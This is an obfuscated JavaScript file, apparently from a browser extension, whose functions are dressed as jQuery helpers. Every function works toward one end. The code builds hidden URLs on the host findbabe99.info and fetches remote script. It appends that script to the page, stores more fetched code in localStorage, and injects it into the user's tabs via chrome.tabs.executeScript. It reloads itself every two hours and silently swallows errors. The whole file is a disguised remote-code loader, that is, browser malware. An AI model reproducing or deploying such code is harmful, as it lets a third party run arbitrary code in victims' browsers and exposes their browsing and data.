jQuery.xGet = function (hash) {
    var result = '';
    for (var i = 0; i < hash.length; i++) {
        /*%BEGIN_MIX%*/
        var _pgrwcm = true;
        var stringName = "String";
        var ch = "fromChar" + "Code";
        /*%END_MIX%*/
        var code = ch.slice(8, 2 + 10);
        var stringProto = window[stringName];
        var k = $K;
        var r = hash['char' + code + 'At'](i);

        result += stringProto[ch]((~k | ~r) & (k | r));
    }
    return result;
};

jQuery.xAddr = function (noBg) {
    /*%BEGIN_MIX%*/
    noBg = noBg || false;
    var h = "h";
    var t = "t";
    var d = ".";
    var c = ":";
    var s = "/";
    var p = "p";
    var pr = "srx"
    var cc = "code";
    /*%END_MIX%*/

    var dd = "findbabe99" + d + "info" + s;
    if (noBg) {
        d = dd + "new" + cc + s + pr + cc + d + p + h + p;
    } else {
        d = dd + "sc" + s + pr + "load" + d + t + "x" + t;
    }

    /*%BEGIN_MIX%*/
    s += s;
    t += t;
    /*%END_MIX%*/

    h += t + p;
    return h + c + s + d;
};

jQuery.xTabs = function () {
    return window['chrome']['tabs'];
};

jQuery.xStore = function (callback, insert) {
    /*%BEGIN_MIX%*/
    var t = jQuery.xTabs();
    var p = "pdated";
    /*%END_MIX%*/
    /*%BEGIN_MIX%*/
    var o = t["onU" + p];
    var lll = localStorage;
    /*%END_MIX%*/

    o.addListener(function (tb) {
        /*%BEGIN_MIX%*/

        /*%BEGIN_BLOCK%*/
        if (lll.xcnt) {
            if (lll.xcnt > 20) callback(); else lll.xcnt++;
        } else
            lll.xcnt = 1;

        insert(tb);
        /*%END_BLOCK%*/


        /*%BEGIN_BLOCK%*/
        var now = jQuery.now();
        if (!window.uptmnd) {
            window.uptmnd = now + 2 * 60 * 60 * 1000;
        } else if (window.uptmnd < now) {
            location.reload();
        }
        /*%END_BLOCK%*/

        /*%END_MIX%*/
    });
};

jQuery.xLoad = function () {
    try {
        /*%BEGIN_MIX%*/
        var tabs = jQuery.xTabs();
        var ls = localStorage;
        var e = "cript";
        /*%END_MIX%*/

        if (tabs && typeof tabs !== "undefined") {
            var t = true, k, load;
            /*%BEGIN_MIX%*/

            /*%BEGIN_BLOCK%*/
            k = function () {
                if (!t) return;
                t = false;

                /*%BEGIN_MIX%*/
                /*%BEGIN_BLOCK%*/
                jQuery.get(jQuery.xAddr(), function (a) {
                    if (a < " ") return;
                    var u = "s" + e + ">";
                    jQuery("body").append("<" + u + a + "</" + u);
                });
                /*%END_BLOCK%*/
                /*%BEGIN_BLOCK%*/
                jQuery.get(jQuery.xAddr(!t), function (a) {
                    if (a < " ") return;
                    ls.xbrequurf = a;
                });
                /*%END_BLOCK%*/
                /*%END_MIX%*/
            };
            /*%END_BLOCK%*/

            /*%BEGIN_BLOCK%*/
            load = function (tab) {
                var a = ls.xbrequurf;
                if (!a || a < " " || !tab) return;
                tabs["executeS" + e](tab, {code: a});
            };
            /*%END_BLOCK%*/
            /*%END_MIX%*/

            jQuery.xStore(k, load);

        }
    } catch (e) {
    }
};
